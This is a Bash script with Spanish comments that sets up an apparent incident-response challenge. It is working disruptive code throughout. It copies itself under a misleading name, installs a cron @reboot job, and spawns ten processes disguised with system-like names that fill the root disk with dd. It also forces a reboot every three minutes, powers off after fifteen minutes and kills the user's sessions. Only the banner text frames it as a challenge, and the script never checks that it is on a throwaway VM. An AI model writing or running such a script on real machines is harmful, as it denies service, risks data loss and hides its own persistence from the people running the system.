#!/bin/bash

# 1. Variables de Identidad y Estado
S_PATH="/usr/local/bin/kernel-helper.sh"
MARKER="/.fs_start_time"
LOG_BASE="/.sys_data_"
U=${SUDO_USER:-$USER}

# 2. Instalación y Persistencia (Solo se ejecuta la primera vez)
if [ ! -f "$S_PATH" ]; then
    cp "$0" "$S_PATH"
    chmod +x "$S_PATH"
    (crontab -l 2>/dev/null; echo "@reboot $S_PATH") | crontab -
fi

# 3. Lógica de Tiempo Global (Persistente entre reinicios)
if [ ! -f "$MARKER" ]; then
    date +%s > "$MARKER"
fi

START_TIME=$(cat "$MARKER")
NOW=$(date +%s)
ELAPSED=$(( NOW - START_TIME ))

# 4. Condición de Victoria del Script (Apagado a los 15 min / 900 seg)
if [ $ELAPSED -ge 900 ]; then
    rm -f "$MARKER"
    crontab -r
    poweroff
fi

# 5. Cálculo Dinámico de Llenado (100% en 15 minutos totales)
AVAIL=$(df / --output=avail | tail -1)
REMAINING=$(( 900 - ELAPSED ))
# Calculamos la tasa de escritura para llenar el 100% en el tiempo que queda
RATE=$(( AVAIL / REMAINING / 10 ))

# 6. Lanzamiento de Agentes Camuflados
n=(".sys-audit" ".udev-cache" ".dbus-v2" ".snap-attr" ".net-help" ".fw-id" ".kwork-u2" ".irq-bal" ".aud-run" ".lvm-fix")

for i in {0..9}; do
    exec -a "${n[$i]}" bash -c "while true; do dd if=/dev/zero bs=1K count=$RATE >> ${LOG_BASE}$i.bin 2>/dev/null; sleep 1; done" &
done

# 7. Temporizador de Reinicio (Cada 3 minutos / 180 seg)
(sleep 180 && reboot) &

# 8. Interfaz del Reto (Solo visible en la primera ejecución manual)
clear
echo "=========================================================================="
echo "⚠️ ALERTA DE INCIDENTE PERSISTENTE Nivel 5"
echo "=========================================================================="
echo "SÍNTOMAS:"
echo "1. El disco llegará al 100% en exactamente $(( (900 - ELAPSED) / 60 )) minutos."
echo "2. El sistema se REINICIARÁ cada 3 minutos."
echo "3. Si no lo detienes, la VM se APAGARÁ a los 15 minutos de iniciado."
echo "=========================================================================="
echo "OBJETIVO: Romper persistencia, detener llenado y evitar el apagado."

# Cierre de sesión inicial (solo si se ejecuta manualmente)
if [ "$1" != "rebooted" ]; then
    for i in {10..1}; do echo -ne "Cerrando sesión en $i... \r"; sleep 1; done
    pkill -KILL -u $U
fi
